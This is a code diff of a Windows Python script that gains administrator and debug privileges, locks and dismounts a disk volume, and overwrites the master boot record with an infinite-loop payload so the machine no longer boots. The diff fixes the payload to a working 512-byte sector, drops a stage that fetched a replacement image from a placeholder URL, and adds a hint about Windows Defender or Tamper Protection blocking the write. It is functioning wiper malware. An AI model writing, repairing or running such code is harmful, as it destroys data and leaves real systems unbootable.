@@ -2,8 +2,6 @@ import tkinter as tk
 import os
 import ctypes
 import sys
-import ssl
-import urllib.request
 from ctypes import wintypes
 
 # Requires: pip install pywin32
@@ -28,6 +26,7 @@ def elevate():
     )
 
 def enable_debug_privilege():
+    """Bypasses standard kernel filters by elevating to Debugger status."""
     try:
         hToken = win32security.OpenProcessToken(
             win32api.GetCurrentProcess(), 
@@ -63,42 +62,26 @@ def run():
     if hDevice != wintypes.HANDLE(-1).value:
         # Dismount for access
         dwBytesReturned = wintypes.DWORD(0)
+        # FSCTL_LOCK_VOLUME = 0x00090018, FSCTL_DISMOUNT_VOLUME = 0x00090020
         dll.Kernel32.DeviceIoControl(hDevice, 0x00090018, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
         dll.Kernel32.DeviceIoControl(hDevice, 0x00090020, None, 0, None, 0, ctypes.byref(dwBytesReturned), None)
         
-        # --- STAGE 1: IMMEDIATE OVERWRITE (MBR) ---
-        print("Stage 1: Overwriting MBR immediately...")
-        mbr_payload = b"\xEB\xFE" + b"PIRATE" * 83 + b"\x55\xAA" # Infinite loop jump + signature
+        # --- PREPARE SECTOR-ALIGNED PAYLOAD (Fixes Error 87) ---
+        # \xEB\xFE is x86 assembly for a jump-to-self infinite loop
+        raw_payload = b"\xEB\xFE" + b"PIRATE" * 10 
+        
+        # Pad with null bytes to exactly 510 bytes, then add the 55AA signature
+        mbr_payload = raw_payload.ljust(510, b"\x00") + b"\x55\xAA"
+        
+        print(f"Payload size: {len(mbr_payload)} bytes (Sector Aligned)")
+        
+        # --- OVERWRITE ---
         written = wintypes.DWORD(0)
-        
-        if dll.Kernel32.WriteFile(hDevice, mbr_payload, len(mbr_payload), ctypes.byref(written), None):
-            print("MBR Destroyed. The VM is now unbootable.")
+        if dll.Kernel32.WriteFile(hDevice, mbr_payload, 512, ctypes.byref(written), None):
+            print("SUCCESS: MBR Overwritten. System will no longer boot.")
         else:
-            print(f"MBR Overwrite failed: {ctypes.get_last_error()}")
-            dll.Kernel32.CloseHandle(hDevice)
-            return
-
-        # --- STAGE 2: DOWNLOAD & REPLACE KERNEL ---
-        print("Stage 2: Attempting to download secondary kernel...")
-        context = ssl._create_unverified_context()
-        kernel_url = "https://example.com/your_kernel.img" # Replace with your link
-        
-        try:
-            with urllib.request.urlopen(kernel_url, context=context) as response:
-                kernel_data = response.read()
-            print(f"Downloaded {len(kernel_data)} bytes.")
-            
-            # Write the downloaded data starting after the MBR (or over it)
-            # We'll just write it from the beginning
-            success = dll.Kernel32.WriteFile(hDevice, kernel_data, len(kernel_data), ctypes.byref(written), None)
-            if success:
-                print("Custom kernel image written successfully.")
-            else:
-                print(f"Kernel write failed: {ctypes.get_last_error()}")
-                
-        except Exception as e:
-            print(f"Download failed after MBR wipe: {e}")
-            print("The system is still dead, but the custom kernel wasn't loaded.")
+            print(f"Overwrite failed. Error: {ctypes.get_last_error()}")
+            print("Hint: Check if Windows Defender or Tamper Protection is active.")
 
         dll.Kernel32.CloseHandle(hDevice)
     else:
